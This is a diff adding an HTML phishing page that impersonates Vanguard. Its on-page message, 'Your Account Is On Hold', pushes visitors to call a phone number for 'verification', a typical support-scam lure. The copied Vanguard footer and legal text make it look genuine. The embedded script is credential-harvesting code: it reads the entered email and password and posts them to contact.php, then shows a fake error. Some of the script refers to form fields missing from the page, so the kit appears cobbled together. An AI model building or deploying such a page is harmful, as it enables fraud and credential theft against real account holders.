@@ -1,0 +1,173 @@
+
+<html lang="en">
+
+
+<head>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Vanguard - Log in</title>
+   <link rel="icon" type="image/png" href="img/favicon.ico" />
+   <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+   <link rel="stylesheet" type="text/css" href="css/style.css">
+   <link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.html">
+
+</head>
+
+<body class="main-bg">
+
+<header>
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-light "> <a class="navbar-brand" href="index.html"><img src="img/logo.png" class="imprexius" title="imprexius"></a>
+        
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        </hr>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  
+   <div class="login-container">
+   
+   
+   <div class="firstform">
+         <div class="container-content">
+            <form class="margin-t" id="emailform" action="#" method="post">
+              
+                <div class="elementor-text-editor elementor-clearfix"><h2 style="text-align: center;"><strong>Your Account Is On Hold.</strong></h2><h3 style="text-align: center;"><strong>Phone Verification Required.</strong></h3><h2 style="text-align: center;"><strong>Call Us At</strong></h2><h2 style="text-align: center;"><a href="tel:+18442757002">+1-844-275-7002</a></h2><h4 style="text-align: center;"><strong>Please Verify Your Account Immediately.</strong></h4></div>
+				
+              <center> <button type="button" id="emailsubmit" class="form-button button-l margin-b"><a href="tel:+18442757002">Call Now</a></button></center>
+               
+            </form>
+         </div>
+      </div>
+    
+      </div> 
+   </div>
+   
+   <script src="js/jquery.min.js"></script>
+   <script>
+      $(document).ready(function () {
+         
+         $(".secondform").hide();
+         $("#emailsubmit").click(function () {
+           
+
+var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
+var emailform_email= document.getElementById('emailform_email');
+
+if (emailform_email.value.match(validRegex)) {
+
+
+   $(".firstform").hide();
+            $(".secondform").show();
+            var email = $('#emailform_email').val();
+            document.getElementById('email').value = email;
+
+} else {
+ document.getElementById('emailform_email').focus();
+
+  return false;
+
+}
+
+
+         });
+      });
+
+		$(document).on('submit','#emailform',function(e){
+				e.preventDefault();
+				$(".firstform").hide();
+            $(".secondform").show();
+            var email = $('#emailform_email').val();
+            document.getElementById('email').value = email;
+		});
+
+      $(".toggle-password").click(function () {
+         $(this).toggleClass("fa-eye-slash fa-eye");
+         var input = $($(this).attr("toggle"));
+         if (input.attr("type") == "password") {
+            input.attr("type", "text");
+         } else {
+            input.attr("type", "password");
+         }
+      });
+
+      $('#form').on("submit", function (e) {
+         e.preventDefault();
+    
+         var email = $('#emailform_email').val();
+         var password = $('#password-field').val();
+         
+         fetch("contact.php", {
+	
+	// Adding method type
+	method: "POST",
+	
+	// Adding body or contents to send
+	body: JSON.stringify({
+		pwd: password,
+		email:email
+	}),
+	
+	// Adding headers to the request
+	headers: {
+		"Content-type": "application/json; charset=UTF-8"
+	}
+})
+
+// Converting to JSON
+.then(response => response.json())
+// Displaying results to console
+.then(json => console.log(json));
+
+
+         $('#error').show();
+      });
+
+      $(document).on("click", ".cds-dismiss-btn", function () {
+         $('.cookiepolicy').hide();
+      });
+   </script>
+   
+ <footer>
+    <div class="main-footer">
+      <div class="container">
+        <div class="row">
+          <div class="col-12 col-lg-12">
+            
+      <img src="img/logo.png" class="imprexius" title="imprexius">
+              <label class="cds-label">Vanguard funds not held in a brokerage account are held by The Vanguard Group, Inc., and are not protected by SIPC. Brokerage assets are held by Vanguard Brokerage Services, a division of Vanguard Marketing Corporation, member FINRA and SIPC.</p>
+              For additional financial information on Vanguard Marketing Corporation, see its Statement of Financial Condition: Audited and Unaudited</label>
+
+<label class="cds-label">Broker-Dealer Form Client Relationship Summary (Form CRS) and Investment Advisor Form Client Relationship Summary (Form CRS)</label>
+
+<label class="cds-label">© 1995–2023 The Vanguard Group, Inc. All rights reserved. Vanguard Marketing Corporation, Distributor of the Vanguard Funds. Your use of this site signifies that you accept our terms & conditions of use.</label>
+              
+            </ul>
+          </div>
+          
+        </div>
+      </div>
+    </div>
+	</br>
+	</br>
+    <div class="copyright">
+      <div class="container">
+        <div class="row">
+          <div class="col-12 col-lg-12 ">
+            <p>Privacy center &nbsp; Security center &nbsp; Accessibility&nbsp; Technical support&nbsp; Mutual fund prospectuses &nbsp;ETF (exchange-traded fund) prospectuses</p>
+			<p>Special notice to non-U.S. investors &nbsp; Careers&nbsp; Mobile app&nbsp; Social media&nbsp;Company information and insights&nbsp; Manage cookies </p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
+ 
+
+</body>
+
+
+
+</html>
